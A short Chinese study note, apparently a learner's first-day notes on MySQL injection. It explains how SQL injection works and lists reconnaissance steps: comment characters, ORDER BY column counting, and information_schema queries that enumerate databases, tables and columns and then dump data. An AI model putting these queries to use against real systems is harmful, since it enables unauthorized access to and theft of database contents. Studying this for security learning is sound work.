# day1:mysql注入初探

- sql注入原理:

sql注入的原理是将sql代码伪装到输入参数中，传递到服务器解析并执行的一种攻击手法。也就是说，在一些对server端发起的请求参数中植入一些sql代码，server端在执行sql操作时，会拼接对应参数，同时也将一些sql注入攻击的“sql”拼接起来，导致会执行一些预期之外的操作。







```React JSX
注释符号: #,--

order by 用于判断显示位，order by 原有的作用是对字段进行一个排序,在sql注入中用order by 来判断排序order by 1就是对一个字段进行排序，如果一共四个字段，你order by 5 数据库不知道怎么排序，就错误了无返回值。

information_schema.tables存放表名和库名的对应

information_schema.columns存放字段名和表名的对应

database();

查询所有数据库：

select group_concat(schema_name) from (information_schema.schemata)

查询某数据库表名:

select group_concat(table_name) from information_schema.tables where table_schema="security"

查某表列名：

select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='email'   //admin为查出来的表名

查某列中的数据

select group_concat(列名) from 数据库.表名
```





